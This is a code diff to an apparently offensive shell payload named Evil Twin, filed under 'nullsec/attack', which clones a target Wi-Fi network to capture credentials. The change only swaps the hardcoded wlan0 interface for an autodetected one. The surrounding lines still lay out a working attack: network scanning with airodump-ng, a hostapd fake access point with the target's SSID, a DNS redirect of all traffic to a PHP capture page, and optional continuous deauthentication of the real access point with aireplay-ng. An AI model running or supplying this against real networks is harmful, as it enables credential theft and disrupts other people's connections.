@@ -4,6 +4,11 @@
 # Description: Clone a target network and capture credentials
 # Category: nullsec/attack
 
+# Autodetect the right wireless interface (exports $IFACE).
+# Falls back to showing the pager error dialog if nothing is plugged in.
+. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
+nullsec_require_iface || exit 1
+
 LOOT_DIR="/mmc/nullsec/eviltwin"
 mkdir -p "$LOOT_DIR"
 
@@ -19,10 +24,8 @@ and capture credentials.
 
 Press OK to configure."
 
-[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }
-
 SPINNER_START "Scanning networks..."
-timeout 12 airodump-ng wlan0 --write-interval 1 -w /tmp/twinscan --output-format csv 2>/dev/null
+timeout 12 airodump-ng $IFACE --write-interval 1 -w /tmp/twinscan --output-format csv 2>/dev/null
 SPINNER_STOP
 
 NET_COUNT=$(grep -c "WPA\|WEP\|OPN" /tmp/twinscan*.csv 2>/dev/null || echo 0)
@@ -72,7 +75,7 @@ killall hostapd dnsmasq aireplay-ng 2>/dev/null
 
 # Create fake AP
 cat > /tmp/twin_hostapd.conf << EOF
-interface=wlan0
+interface=$IFACE
 driver=nl80211
 ssid=$TARGET_SSID
 hw_mode=g
@@ -140,11 +143,11 @@ LOG "Starting Evil Twin..."
 # Start fake AP
 hostapd /tmp/twin_hostapd.conf &
 sleep 2
-ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up
+ifconfig $IFACE 10.0.0.1 netmask 255.255.255.0 up
 
 # DNS redirect
 cat > /tmp/twin_dns.conf << EOF
-interface=wlan0
+interface=$IFACE
 dhcp-range=10.0.0.10,10.0.0.100,5m
 address=/#/10.0.0.1
 EOF
@@ -157,7 +160,7 @@ php -S 10.0.0.1:80 &
 # Optional deauth
 if [ "$DEAUTH_REAL" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
     LOG "Deauthing real AP..."
-    aireplay-ng -0 0 -a "$REAL_BSSID" wlan0 &
+    aireplay-ng -0 0 -a "$REAL_BSSID" $IFACE &
 fi
 
 LOG "Evil Twin active: $TARGET_SSID"
